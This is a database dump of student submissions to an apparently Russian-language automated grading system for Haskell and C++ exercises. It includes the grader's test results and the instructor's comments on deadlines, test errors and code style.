(1429, 35, 'jamesbrain', '2012-10-04 00:38:33', 1, 'len x1 y1 x2 y2 = sqrt ((x1-x2)^2 + (y1-y2)^2)\r\n\r\nisosc (x1,y1) (x2,y2) (x3,y3) = len x1 y1 x2 y2 == len x2 y2 x3 y3 || len x1 y1 x3 y3 == len x2 y2 x3 y3 || len x1 y1 x3 y3 == len x1 y1 x2 y2\r\n', '<br/>Тесты успешно пройдены!'),
(1430, 39, '51559263', '2012-10-04 00:42:54', 0, 'data Tree = Empty | Node Integer Tree Tree\r\n\n\r\n\ninstance Eq Tree where\r\n\n    Empty == Empty = True\r\n\n    Node _ _ _ == Empty = False \r\n\n\r\n\nisLeaf Empty = True;\r\n\nisLeaf ( Node _ l r ) = ( l == Empty ) && ( r == Empty )\r\n\n\r\n\nnextGen [] = []\r\n\nnextGen ( ( Node _ l r ) : xs ) = l : r : nextGen xs\r\n\n\r\n\ncheckList xs = foldr ( || ) ( False ) ( map ( isLeaf ) xs )\r\n\n\r\n\nmH xs d | ( checkList xs == True ) = d\r\n\n        | otherwise                = mH ( nextGen xs ) ( d + 1 )\r\n\n\r\n\nminHeight t = mH [t] 0\n', 'Выражение имеет неправильное значение: minHeight (Node 1 (Node 2 (Node 3 Empty Empty) Empty) Empty)'),
(1431, 39, '51559263', '2012-10-04 00:57:04', 1, 'data Tree = Empty | Node Integer Tree Tree\r\n\r\n\r\n\r\ninstance Eq Tree where\r\n\r\n    Empty == Empty = True\r\n\r\n    Node _ _ _ == Empty = False \r\n\r\n\r\n\r\nisLeaf Empty = True;\r\n\r\nisLeaf ( Node _ l r ) = ( l == Empty ) && ( r == Empty )\r\n\r\n\r\n\r\nnextGen [] = []\r\n\r\nnextGen ( ( Node _ l r ) : xs ) = l : r : nextGen xs\r\n\r\n\r\n\r\ncheckList xs = foldr ( || ) ( False ) ( map ( isLeaf ) xs )\r\n\r\n\r\n\r\nmH xs d | ( checkList xs == True ) = d\r\n\r\n        | otherwise                = mH ( filter ( /= Empty ) ( nextGen xs ) ) ( d + 1 )\r\n\r\n\r\n\r\nminHeight t = mH [t] 0\r\n', '<br/>Тесты успешно пройдены!'),
(1432, 38, '442421', '2012-10-04 05:57:21', 1, 'data Tree=Empty|Node Integer Tree Tree deriving Show\r\nheight (Node x Empty Empty) = 0\r\nheight (Node x l Empty) = 1 + height l\r\nheight (Node x Empty r) = 1 + height r\r\nheight (Node x l r) = 1 + max (height l) (height r)', '<br/>Тесты успешно пройдены!'),
(1433, 38, '3431532', '2012-10-04 06:04:16', 0, 'height Empty = 0 \r\nheight (Node _ Empty Empty) = 0\r\nheight (Node _ t1 t2) = 1 + (max (height t1) (height t2)) ', 'Не удалось вычислить выражение "height (Node 1 Empty Empty)", проверьте правильность синтаксиса'),
(1434, 38, '3431532', '2012-10-04 06:04:37', 1, 'data Node = Node Int Node Node | Empty\r\n\r\nheight Empty = 0 \r\nheight (Node _ Empty Empty) = 0\r\nheight (Node _ t1 t2) = 1 + (max (height t1) (height t2)) ', '<br/>Тесты успешно пройдены!'),
(1435, 42, '471091', '2012-10-04 06:29:58', 1, 'myfoldl               :: (a -> b -> a) -> a -> [b] -> a\r\nmyfoldl func s []     = s\r\nmyfoldl func s (x:xs) = myfoldl func (func s x) xs\r\n', '<br/>Тесты успешно пройдены!'),
(1436, 41, '532002', '2012-10-04 06:45:05', 1, 'countOdd xs = foldr (x y -> (mod x 2)+y) 0 xs\r\n\r\ncountOdd1 xs = length (filter odd xs)\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1437, 44, '3607492', '2012-10-04 07:25:41', 0, 'check a 0 _ _ x y=if(abs a==1)then(a*x,a*y)else(0,0)\r\ncheck a b x y o m=check b(a-b*p)(o-x*p)(m-y*p)x y where p=div a b\r\neuclid a b=case(abs(a),abs(b))of\r\n (1,0)->(a,0)\r\n (0,1)->(0,b)\r\n (0,_)->(0,0)\r\n (_,0)->(0,0)\r\n _->if(a>b)then check a b 0 1 1 0 else(snd x,fst x)where x=(check b a 0 1 1 0)\r\nfunc 0 0 0=(0,1)\r\nfunc a b c=if(p==0||mod c p/=0)then(0,0)else(t*fst x,t*snd x)\r\n where\r\n x=euclid(div a p)(div b p)\r\n p=gcd a b\r\n t=div c p\r\ndioph r e=case(r,e)of\r\n ([a,b,0,d],[0,0,n,p])->if(mod p n==0)then[d*fst x,d*snd x,div p n]else[0,0,0]where x=euclid a b\r\n ([a,0,0,b],_)->dioph e r\r\n ([0,a,0,b],_)->dioph e r\r\n ([0,0,a,b],_)->dioph e r\r\n (_,[0,m,0,p])->[x,y,z]where[x,z,y]=dioph[0,0,m,p][a,c,b,d]\r\n (_,[m,0,0,p])->[x,y,z]where[z,y,x]=dioph[0,0,m,p][c,b,a,d]\r\n ([a,0,c,d],[o,m,0,p])->[x,y,z]where[z,y,x]=dioph[c,0,a,d][0,m,o,p]\r\n (_,[o,m,0,p])->[x,y,z]where[x,z,y]=dioph[a,c,b,d][o,0,m,p]\r\n (_,_)->[q,w,div(p-o*q-m*w)n]\r\n where\r\n (q,w)=func(n*a-c*o)(n*b-c*m)(n*d-c*p) \r\n [o,m,n,p]=e\r\n [a,b,c,d]=r', 'Не удалось вычислить выражение "let [x,y,z] = dioph [0,0,0,0] [0,1,0,3] in y", проверьте правильность синтаксиса'),
(1438, 42, '532002', '2012-10-04 07:26:09', 0, 'myfoldr (f) h []  = h\r\n\nmyfoldr (f) h (x:xs) = myfoldr f (h `f` x) xs\r\n\n\r\n\n\n', 'Не удалось вычислить выражение "myfoldl (+) 0 [1,2,3]", проверьте правильность синтаксиса'),
(1439, 37, '442421', '2012-10-04 07:26:36', 0, 'minsum x = minimum (map tuplesum (zip (tail x) x))\r\ntuplesum (x,y) = x+y\r\n', 'Выражение имеет неправильное значение: minsum [2,9,1,3]'),
(1440, 42, '532002', '2012-10-04 07:27:14', 1, 'myfoldl (f) h []  = h\r\n\r\nmyfoldl (f) h (x:xs) = myfoldl f (h `f` x) xs\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1441, 37, '442421', '2012-10-04 07:28:53', 0, '', 'Не удалось вычислить выражение "minsum [1,8,3,2,7] ", проверьте правильность синтаксиса'),
(1442, 37, '442421', '2012-10-04 07:29:12', 0, 'minsum x = minimum (map tuplesum (zip (tail x) x))\r\ntuplesum (x,y) = x+y', 'Выражение имеет неправильное значение: minsum [2,9,1,3]'),
(1443, 37, '442421', '2012-10-04 07:29:46', 0, 'minsum x = minimum (map tuplesum (zip (tail x) x))\r\ntuplesum (x,y) = x+y', 'Выражение имеет неправильное значение: minsum [2,9,1,3]'),
(1444, 37, '442421', '2012-10-04 07:31:27', 1, 'minsum x = minimum (map tuplesum (zip (tail x) x))\r\ntuplesum (x,y) = x+y\r\n--неужели правильный ответ не 4 ?? \r\n   --- OK, у вас все правильно, это я добавил тест с ошибкой :)', 'Выражение имеет неправильное значение: minsum [2,9,1,3]'),
(1445, 44, '3607492', '2012-10-04 07:33:53', 0, 'check a 0 _ _ x y=if(abs a==1)then(a*x,a*y)else(0,0)\n\ncheck a b x y o m=check b(a-b*p)(o-x*p)(m-y*p)x y where p=div a b\n\neuclid a b=case(abs(a),abs(b))of\n\n (1,0)->(a,0)\n\n (0,1)->(0,b)\n\n (0,_)->(0,0)\n\n (_,0)->(0,0)\n\n _->if(a>b)then check a b 0 1 1 0 else(snd x,fst x)where x=(check b a 0 1 1 0)\n\nfunc 0 0 0=(0,1)\n\nfunc a b c=if(p==0||mod c p/=0)then(0,0)else(t*fst x,t*snd x)\n\n where\n\n x=euclid(div a p)(div b p)\n\n p=gcd a b\n\n t=div c p\n\ndioph r e=case(r,e)of\n\n ([0,0,0,0],_)->if(o/=0 && mod p o == 0) then [div p o,0,0] else if (m/=0 && mod p m ==0) then [0,div p m,0] else if (n/=0 && mod p n ==0) then [0,0,div p n] else [0,0,0]\n\n ([a,b,0,d],[0,0,n,p])->if(mod p n==0)then[d*fst x,d*snd x,div p n]else[0,0,0]where x=euclid a b\n\n ([a,0,0,b],_)->dioph e r\n\n ([0,a,0,b],_)->dioph e r\n\n ([0,0,a,b],_)->dioph e r\n\n (_,[0,m,0,p])->[x,y,z]where[x,z,y]=dioph[0,0,m,p][a,c,b,d]\n\n (_,[m,0,0,p])->[x,y,z]where[z,y,x]=dioph[0,0,m,p][c,b,a,d]\n\n ([a,0,c,d],[o,m,0,p])->[x,y,z]where[z,y,x]=dioph[c,0,a,d][0,m,o,p]\n\n (_,[o,m,0,p])->[x,y,z]where[x,z,y]=dioph[a,c,b,d][o,0,m,p]\n\n (_,_)->[q,w,div(p-o*q-m*w)n]\n\n where\n\n (q,w)=func(n*a-c*o)(n*b-c*m)(n*d-c*p) \n\n [o,m,n,p]=e\n\n [a,b,c,d]=r\n\n\n\n\n', 'Выражение имеет неправильное значение: let [x,y,z] = dioph [7,11,0,1] [0,25,19,1] in (7*x+11*y, 25*y+19*z)'),
(1446, 41, '5772638', '2012-10-04 07:34:45', 0, 'countOdd a =foldr  (+) 0 [n^0|n<-a, mod n 2 ==0]\r\ncountOdd1 a =foldl (+) 0 (map(^0)( filter odd a))', 'Выражение имеет неправильное значение: countOdd [2, 3, 4, 8, 5, 33, 9]'),
(1447, 44, '3607492', '2012-10-04 07:36:32', 2, '  --- Вообще очень хорошо, но у вас все-таки не все вырожденные случаи рассмотренны\r\n  --- Например: dioph [0,1,0,2] [0,1,0,2]\r\n  --- У вас зацикливается (не могу добавить это в тест, потому что система тестирования\r\n  --- тогда сама зависнет :( )\r\ncheck a 0 _ _ x y=if(abs a==1)then(a*x,a*y)else(0,0)\r\n\r\ncheck a b x y o m=check b(a-b*p)(o-x*p)(m-y*p)x y where p=div a b\r\n\r\neuclid a b=case(abs(a),abs(b))of\r\n\r\n (1,0)->(a,0)\r\n\r\n (0,1)->(0,b)\r\n\r\n (0,_)->(0,0)\r\n\r\n (_,0)->(0,0)\r\n\r\n _->if(a>b)then check a b 0 1 1 0 else(snd x,fst x)where x=(check b a 0 1 1 0)\r\n\r\nfunc 0 0 0=(0,1)\r\n\r\nfunc a b c=if(p==0||mod c p/=0)then(0,0)else(t*fst x,t*snd x)\r\n\r\n where\r\n\r\n x=euclid(div a p)(div b p)\r\n\r\n p=gcd a b\r\n\r\n t=div c p\r\n\r\ndioph r e=case(r,e)of\r\n\r\n ([0,0,0,0],_)->if(o/=0 && mod p o == 0) then [div p o,0,0] else if (m/=0 && mod p m ==0) then [0,div p m,0] else if (n/=0 && mod p n ==0) then [0,0,div p n] else [0,0,0]\r\n\r\n ([a,b,0,d],[0,0,n,p])->if(mod p n==0)then[d*fst x,d*snd x,div p n]else[0,0,0]where x=euclid a b\r\n\r\n ([a,0,0,b],_)->dioph e r\r\n\r\n ([0,a,0,b],_)->dioph e r\r\n\r\n ([0,0,a,b],_)->dioph e r\r\n\r\n (_,[0,m,0,p])->[x,y,z]where[x,z,y]=dioph[0,0,m,p][a,c,b,d]\r\n\r\n (_,[m,0,0,p])->[x,y,z]where[z,y,x]=dioph[0,0,m,p][c,b,a,d]\r\n\r\n ([a,0,c,d],[o,m,0,p])->[x,y,z]where[z,y,x]=dioph[c,0,a,d][0,m,o,p]\r\n\r\n (_,[o,m,0,p])->[x,y,z]where[x,z,y]=dioph[a,c,b,d][o,0,m,p]\r\n\r\n ([a,b,0,d],_)->dioph e r\r\n\r\n (_,_)->[q,w,div(p-o*q-m*w)n]\r\n\r\n where\r\n\r\n (q,w)=func(n*a-c*o)(n*b-c*m)(n*d-c*p) \r\n\r\n [o,m,n,p]=e\r\n\r\n [a,b,c,d]=r\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1448, 41, '5772638', '2012-10-04 07:37:23', 1, 'countOdd a =foldr  (+) 0 [n^0|n<-a, mod n 2 ==1]\r\n     --- первая задача не по условию, надо было использовать _только_ foldr, без list comprehension\r\n     --- Но OK, засчитано\r\ncountOdd1 a =foldl (x y -> x+y) 0 (map(^0)( filter odd a))\r\n   ', '<br/>Тесты успешно пройдены!'),
(1449, 40, '532002', '2012-10-04 07:47:56', 1, 'frame n = frame1 n n [] where\r\n\r\nframe1 _ 0 xss = xss\r\n\r\nframe1 n i xss = frame1 n (i-1)((foldr ( y ys -> if(y==1 || y==n || i==1 || i==n) then(1:ys) else (0:ys)) [] [1..n]):xss)\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1450, 39, '442421', '2012-10-04 07:58:14', 0, 'data Tree=Empty|Node Integer Tree Tree deriving Show\r\n--\r\nminHeight (Node x Empty Empty) = 0 ;\r\n\r\nminHeight (Node x l r) = minOptDfs (-1) 0 (Node x l r) - 1\r\n\r\nminOptDfs mH cH Empty = if mH<0 then cH else min mH cH\r\nminOptDfs mH cH (Node x l r) = \r\n			       if (mH>(-1)) && (cH+1>=mH) then --обрезаю лишний путь\r\n				     mH \r\n			       else \r\n				     min (minOptDfs mH (cH+1) l) (minOptDfs mH (cH+1) r)\r\n\r\n\r\n', 'Выражение имеет неправильное значение: minHeight (Node 1 (Node 2 Empty (Node 3 Empty Empty)) (Node 4 (Node 5 Empty Empty) Empty))'),
(1451, 38, '532002', '2012-10-04 08:12:46', 1, 'data Tree = Empty | Node Integer Tree Tree\r\n\r\nheight t = height1 t 0 where\r\n\r\nheight1 Empty h = h-1\r\n\r\nheight1 (Node n l r) h = max (height1 l (h+1)) (height1 r (h+1))\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1452, 39, 'jamesbrain', '2012-10-04 08:17:05', 0, 'data Tree = Empty | Node Integer Tree Tree\r\n\nminHeight t = minHeight1 t 1000 0\r\n\nminHeight1 Empty _ curLen = curLen\r\n\nminHeight1 (Node _ Empty Empty) _ curLen = curLen\r\n\nminHeight1 (Node _ left right) curMin curLen = if curLen < curMin\r\n\n	then \r\n\n		let leftMin = minHeight1 left curMin (curLen + 1) in\r\n\n		min leftMin (minHeight1 right (min curMin leftMin) (curLen + 1))\r\n\n	else\r\n\n		curMin\n', 'Выражение имеет неправильное значение: minHeight (Node 1 (Node 2 (Node 3 Empty Empty) Empty) Empty)'),
(1453, 39, 'jamesbrain', '2012-10-04 08:19:56', 1, 'data Tree = Empty | Node Integer Tree Tree\r\n\r\nminHeight t = minHeight1 t 1000 0\r\n\r\nminHeight1 Empty curMin _ = curMin\r\n\r\nminHeight1 (Node _ Empty Empty) _ curLen = curLen\r\n\r\nminHeight1 (Node _ left right) curMin curLen = if curLen < curMin\r\n\r\n	then \r\n\r\n		let leftMin = minHeight1 left curMin (curLen + 1) in\r\n\r\n		min leftMin (minHeight1 right (min curMin leftMin) (curLen + 1))\r\n          --- Я думаю тут min оба раза не нужен, потому что результат функции всегда <= curMin,\r\n          --- так у вас алгоритм устроен..\r\n	else\r\n\r\n		curMin\r\n', '<br/>Тесты успешно пройдены!'),
(1454, 36, '471091', '2012-10-04 08:41:38', 1, 'makeUpper  n = take n [1,1..]\r\nmakeMiddle n = 1 : take (n-2) [0,0..] ++ [1]\r\n\r\ncubeTable n = [makeUpper n] ++ take (n-2) (repeat (makeMiddle n)) ++ [makeUpper n]\r\n', 'Выражение имеет неправильное значение: cubeTable 4'),
(1455, 40, '471091', '2012-10-04 08:42:46', 1, 'makeUpper  n = take n [1,1..]\r\nmakeMiddle n = 1 : take (n-2) [0,0..] ++ [1]\r\n\r\nframe n = [makeUpper n] ++ take (n-2) (repeat (makeMiddle n)) ++ [makeUpper n]\r\n', '<br/>Тесты успешно пройдены!'),
(1456, 41, '442421', '2012-10-04 08:51:20', 1, 'countOdd [] = 0\r\ncountOdd x = foldr (y s -> if odd y then s+1 else s) 0 x \r\n\r\ncountOdd1 [] = 0 \r\ncountOdd1 x = sum (map (x->if odd x then 1 else 0) x)', '<br/>Тесты успешно пройдены!'),
(1457, 35, '985727', '2012-10-04 08:52:39', 1, 'l (x1,y1) (x2,y2) = sqrt( (x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2))\r\nisosc (x1,y1) (x2,y2) (x3,y3) = if ( l (x1,y1) (x2,y2)  == l (x1,y1) (x3,y3)) then True\r\nelse if ( l (x1,y1) (x2,y2)  == l (x2,y2) (x3,y3)) then True\r\nelse if ( l (x1,y1) (x3,y3)  == l (x2,y2) (x3,y3)) then True\r\nelse False', '<br/>Тесты успешно пройдены!'),
(1458, 42, '442421', '2012-10-04 08:54:34', 1, 'myfoldl f x []     =  x\r\nmyfoldl f y (x:xs) =  myfoldl f (f y x) xs', '<br/>Тесты успешно пройдены!'),
(1459, 39, 'artyushov', '2012-10-04 08:56:56', 0, 'data Tree = Empty | Node Integer Tree Tree\r\nminHeight1 currMin currHeight Empty = currHeight\r\nminHeight1 currMin currHeight (Node x l r) =\r\n  if (currMin > 0 && currHeight >= currMin) then currMin\r\n  else\r\n    let leftMin = minHeight1 currMin (currHeight + 1) l\r\n    in min leftMin (minHeight1 leftMin (currHeight + 1) r)\r\nminHeight Empty = 0\r\nminHeight (Node x l r) = minHeight1 (-1) (-1) (Node x l r)', 'Выражение имеет неправильное значение: minHeight (Node 1 (Node 2 Empty (Node 3 Empty Empty)) (Node 4 (Node 5 Empty Empty) Empty))'),
(1460, 35, '214982', '2012-10-04 09:01:47', 1, 'sqr a = a*a\r\n\r\ndist (x, y) (z, t) = sqrt(abs(sqr(z - x) + sqr(t - y)))\r\n\r\nisosc (x, y) (z, t) (p, r) = if (dist (x, y) (p,r) == dist(x, y) (z, t)) then True else if (dist (p, r) (x, y) == dist(p, r) (z, t)) then True else (dist (z, t) (x, y) == dist (z, t) (p, r))', '<br/>Тесты успешно пройдены!'),
(1461, 40, '442421', '2012-10-04 09:12:21', 1, 'frame 0 = [[]]\r\nframe 1 = [[1]]\r\n\r\nframe n = frame'' 1 n []\r\n\r\nframe'' 1 n x= frame'' 2 n (x++[getOuterLine n])\r\nframe'' i n x= if i==n then x++[getOuterLine n]\r\n		else frame'' (i+1) n (x++[getInnerLine n])\r\n\r\ngetOuterLine n = map (mod 1) [2..n+1]\r\ngetInnerLine n = (map (div 1) [1..n-1])++[1]', '<br/>Тесты успешно пройдены!'),
(1462, 40, '214982', '2012-10-04 09:17:55', 1, 'lineupdown 1 = [1]\r\nlineupdown n = (1:(lineupdown (n-1)))\r\n\r\nlinewithnulls 1 = [1]\r\nlinewithnulls n = (0:(linewithnulls (n-1)))\r\n\r\nlinemid n = 1:(linewithnulls (n - 1))\r\n\r\nframelocal 1 n = [lineupdown n]\r\nframelocal k n = (linemid n):(framelocal (k - 1) n)\r\n\r\nframe 1 = [[1]]\r\nframe n = (lineupdown n) : (framelocal (n -1) n)', '<br/>Тесты успешно пройдены!'),
(1463, 39, '442421', '2012-10-04 09:33:25', 2, '  --- Что-то у вас не так..\r\n  --- Вот еще тест: \r\n  --- minHeight (Node 1 Empty (Node 1 (Node 1 Empty (Node 1 Empty (Node 1 Empty Empty ) ) )Empty  ) )\r\n  --- Возвращает 0, а должно быть, если не ошибаюсь, 4\r\n  --- Если хотите, можете попробовать исправить, скажем до субботы включительно, раз уж вы начали писать.\r\n  --- (Срок уже вышел, но вы можете использовать пункт "Загрузить решение" на стартовой странице)\r\n\r\ndata Tree=Empty|Node Integer Tree Tree deriving Show\r\n--\r\n\r\nminHeight (Node x Empty Empty) = 0 ;\r\n\r\nminHeight (Node x l r) = minOptDfs (getInitialHeight 0 (Node x l r)) 0 (Node x l r) - 1\r\n\r\nminOptDfs mH cH Empty = min mH cH\r\nminOptDfs mH cH (Node x l r) = \r\n			if (cH+1)>=mH then mH\r\n			else \r\n			   if mH>(minOptDfs mH (cH+1) l) then minOptDfs mH (cH+1) l\r\n			   else \r\n				if mH>(minOptDfs mH (cH+1) r) then minOptDfs mH (cH+1) r\r\n				else mH\r\n\r\n\r\n\r\ngetInitialHeight h (Node x Empty Empty) = h\r\ngetInitialHeight h (Node x Empty r) = getInitialHeight (h+1) r\r\ngetInitialHeight h (Node x l r) = getInitialHeight (h+1) l', 'Выражение имеет неправильное значение: minHeight (Node 1 (Node 2 Empty (Node 3 Empty Empty)) (Node 4 (Node 5 Empty Empty) Empty))'),
(1464, 39, '419046', '2012-10-04 09:37:45', 0, 'data Tree = Empty | Node Integer Tree Tree\r\n\nminheight (Node a l r) = minheight1 0 1000000 (Node a l r)\r\n\nminheight1 min1 h Empty = min\r\n\nminheight1 min1 h (Node a l r) = if (h > min1)||(l == Empty)||(r == Empty)\r\n\n				then h \r\n\n				else \r\n\n					let\r\n\n						a = minheight1 min1 (h+1) l \r\n\n					in if (a< min1) then min a (minheight1 a (h+1) r)\r\n\nelse min1\r\n\n--minheigh right h  \r\n\n				--(let\r\n\n 				--    left = minheight1 n (h + 1) l\r\n\n 				--   right = minheight1 left (h + 1) r\r\n\n				--  in right)\n', 'Не удалось вычислить выражение "minHeight (Node 1 Empty Empty)", проверьте правильность синтаксиса'),
(1465, 48, '397095', '2012-10-04 10:28:10', 1, 'myreverse ys = (foldr (x f -> f . (x:)) (id) ys) []', '<br/>Тесты успешно пройдены!'),
(1466, 35, '239817', '2012-10-04 11:02:28', 0, 'isosc :: (Num a) => (a,a) -> (a,a) -> (a,a) -> Bool\n\nisosc x y z = hasEqual $ map squareDist $ getPairs x y z\n\n    where\n\n        getPairs :: a -> a -> a -> [(a,a)]\n\n        getPairs x y z = [(x,y), (y,z), (z,x)]\n\n        squareDist :: (Num a) => ((a,a), (a,a)) -> a\n\n        squareDist ((x1,y1), (x2,y2)) = (x1 - x2) ^ 2 + (y1 - y2) ^ 2\n\n        hasEqual :: (Num a) => [a] -> Bool\n\n        hasEqual [x, y, z] = (x == y ) || (y == z) || (z == x)\n\n\n', 'Не удалось вычислить выражение "isosc (0, 2) (2, 0) (2,2)", проверьте правильность синтаксиса'),
(1467, 35, '239817', '2012-10-04 11:03:31', 0, 'isosc :: (Num a) => (a,a) -> (a,a) -> (a,a) -> Bool\r\nisosc x y z = hasEqual $ map squareDist $ getPairs x y z\r\n    where\r\n        getPairs :: a -> a -> a -> [(a,a)]\r\n        getPairs x y z = [(x,y), (y,z), (z,x)]\r\n        squareDist :: (Num a) => ((a,a), (a,a)) -> a\r\n        squareDist ((x1,y1), (x2,y2)) = (x1 - x2) ^ 2 + (y1 - y2) ^ 2\r\n        hasEqual :: (Num a) => [a] -> Bool\r\n        hasEqual [x, y, z] = (x == y ) || (y == z) || (z == x)', 'Не удалось вычислить выражение "isosc (0, 2) (2, 0) (2,2)", проверьте правильность синтаксиса'),
(1468, 35, '239817', '2012-10-04 11:07:44', 1, 'isosc x y z = hasEqual $ map squareDist $ getPairs x y z\r\n    where\r\n        getPairs x y z = [(x,y), (y,z), (z,x)]\r\n        squareDist ((x1,y1), (x2,y2)) = (x1 - x2) ^ 2 + (y1 - y2) ^ 2\r\n        hasEqual [x, y, z] = (x == y ) || (y == z) || (z == x)', '<br/>Тесты успешно пройдены!'),
(1469, 36, '239817', '2012-10-04 11:18:27', 2, '   ---  У вас задачи 6 набора, к сожалению, присланы после крайнего срока\r\n   --- (срок - 13:40, начало пары). Давайте я вам засчитаю половину этих\r\n   --- задач, но в следующий раз, пожалуйста, присылайте не позже\r\n   --- 13:40, а то они не будут засчитаны.\r\ncubeTable n = map (x -> (x, x^3)) [1..n]', '<br/>Тесты успешно пройдены!'),
(1470, 37, '239817', '2012-10-04 11:46:30', 0, 'minsum l = minimum $ ((x,_) -> x) $ foldl ((l, prev) x -> (l ++ [prev + x], x)) ([], head l) (tail l)\r\n', 'Выражение имеет неправильное значение: minsum [2,9,1,3]'),
(1471, 37, '239817', '2012-10-04 11:52:28', 1, 'minsum l = minimum $ ((x,_) -> x) $ foldl ((l, prev) x -> (l ++ [prev + x], x)) ([], head l) (tail l)\r\n  --- У вас все правильно, это была ошибка в тесте, извините..\r\n', 'Выражение имеет неправильное значение: minsum [2,9,1,3]'),
(1472, 40, '239817', '2012-10-04 12:25:52', 1, 'frame 1 = [[1]]\r\nframe n = (replicate n 1) : (take (n-2) (repeat ([1] ++ (replicate (n-2) 0) ++ [1]) )) ++ [replicate n 1]', '<br/>Тесты успешно пройдены!'),
(1473, 42, '239817', '2012-10-04 12:30:58', 2, 'myfoldl f acc [] = acc\r\n\r\nmyfoldl f acc l = myfoldl f (f acc $ head l) $ tail l\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1474, 41, '239817', '2012-10-04 12:43:58', 1, 'countOdd l = foldr (x acc -> if (odd x) then acc+1 else acc) 0 l\r\n\r\n\r\n\r\ncountOdd1 l = length $ filter odd l\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1475, 43, '4837959', '2012-10-04 13:26:30', 1, 'euclid a b = euclid'' a b 0 1 1 0 \r\neuclid'' _ 0 _ x2 _ y2 = (x2, y2) \r\neuclid'' a b x1 x2 y1 y2 = let \r\n                            q = div a b \r\n                            r = a - q * b \r\n                            x = x2 - q * x1\r\n                            y = y2 - q * y1\r\n                          in euclid'' b r x x1 y y1', '<br/>Тесты успешно пройдены!'),
(1476, 50, '3607492', '2012-10-04 14:15:27', 2, 'template <class C>\r\nbool any(bool (*func)(int x),C subj)\r\n   --- Нет, так не очень хорошо. Вы написали, что параметр any - это указатель на функцию.\r\n   --- А фактически передаете лямбда выражение. Оно передастся в данном случае, но в более сложном,\r\n   --- если там будет непустой capture list - не передастся\r\n   --- Например:\r\n   ---    int n = 20;\r\n   ---    bool r = any([&](int x){ return x%n==0;}, ... дерево ...);\r\n   --- (Мы про такие ситуации, кстати, в следующий раз поговорим)\r\n   --- Исправьте, пожалуйста. Тут я бы советовал сделать тип func параметром шаблона, еще и проще получится\r\n   --- Или в принципе, можно использовать для типа шаблон function, в стандартной библиотеке теперь есть такой \r\n {\r\n    if (subj==nullptr) return false;\r\n    \r\n    return func((*subj).getVal())||any(func, (*subj).getRight())||any(func, (*subj).getLeft());\r\n          --- Если все равно будете исправлять, замените, пожалуйста, всюду (*subj).имя на subj->имя :)\r\n}\r\n\r\nclass TreeNode {\r\npublic:\r\n    TreeNode(const int val) : val_(val), left_(NULL), right_(NULL) {}\r\n    ~TreeNode( ) {\r\n       \r\n    }\r\n    \r\n    const int getVal( ) const {return(val_);}\r\n           --- Тут кстати скобки после return не нужны (и везде дальше).\r\n    void setVal(const int val) {val_ = val;}\r\n    void setRightChild(TreeNode* p) {\r\n        right_ = p;\r\n    }\r\n    void setLeftChild(TreeNode* p) {\r\n        left_ = p;\r\n    }\r\n    \r\n	\r\n\r\n    \r\n    TreeNode* getLeft( ) {return(left_);}\r\n    TreeNode* getRight( ) {return(right_);}\r\n    \r\nprivate:\r\n    int val_;\r\n    TreeNode* left_;\r\n    TreeNode* right_;\r\n};\r\n\r\n\r\n\r\nint main(int argc, char const *argv[])\r\n{\r\n	\r\n    TreeNode root(1);\r\n    TreeNode node2(2);\r\n    TreeNode node3(3);\r\n    TreeNode node4(4);\r\n    root.setLeftChild(&node2);\r\n    root.setRightChild(&node3);\r\n    node3.setLeftChild(&node4);\r\n    bool r = any([](int x){ return x%2==0;}, &', '<br/>Тесты успешно пройдены!'),
(1477, 46, '4837959', '2012-10-04 14:19:55', 0, '#include <iostream>\r\n#include <algorithm>\r\n#include <vector>\r\n\r\nusing namespace std;\r\n\r\nbool isEven(int n) {\r\n    return (n & 1) == 0;\r\n}\r\n\r\nbool anyEven(vector<int> *a) {\r\n    vector<int>::iterator it = find_if(a->begin(), a->end(), [] (int n) { return (n & 1) == 0; }); \r\n    return it != a->end();\r\n}\r\n\r\nint main() {\r\n    vector<int> a;\r\n\r\n    a.push_back(1);\r\n    a.push_back(3);\r\n    a.push_back(7);\r\n    cout << (anyEven(&a) ? "True" : "False") << endl;\r\n\r\n    a.push_back(2);\r\n    a.push_back(5);\r\n    cout << (anyEven(&a) ? "True" : "False") << endl;\r\n', '<br/>Тесты успешно пройдены!'),
(1478, 46, '4837959', '2012-10-04 14:20:31', 1, '#include <iostream>\r\n#include <algorithm>\r\n#include <vector>\r\n\r\nusing namespace std;\r\n\r\nbool isEven(int n) {\r\n    return (n & 1) == 0;\r\n}\r\n\r\nbool anyEven(vector<int> *a) {\r\n  --- Просто как замечание, лучше const vector<int> *a\r\n  --- (так как вы не меняете параметр)\r\n  --- а еще лучше, видимо, const vector<int> &a\r\n    vector<int>::iterator it = find_if(a->begin(), a->end(), [] (int n) { return (n & 1) == 0; }); \r\n    return it != a->end();\r\n}\r\n\r\nint main() {\r\n    vector<int> a;\r\n\r\n    a.push_back(1);\r\n    a.push_back(3);\r\n    a.push_back(7);\r\n    cout << (anyEven(&a) ? "True" : "False") << endl;\r\n\r\n    a.push_back(2);\r\n    a.push_back(5);\r\n    cout << (anyEven(&a) ? "True" : "False") << endl;\r\n}', '<br/>Тесты успешно пройдены!'),
(1479, 50, 'Deutsche', '2012-10-04 14:24:44', 1, 'This problem was sent by email, accept it please', '<br/>Тесты успешно пройдены!'),
(1480, 43, '239817', '2012-10-04 14:42:20', 1, 'euclid 1 a = (1, 0)\r\n\r\neuclid a b = \r\n\r\n	if (a < b)\r\n\r\n	then ((x,y) -> (y,x)) $ euclid b a	\r\n\r\n	else ((x,y) -> (x, y -  x * (a `div` b))) $ euclid (a `rem` b) b\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
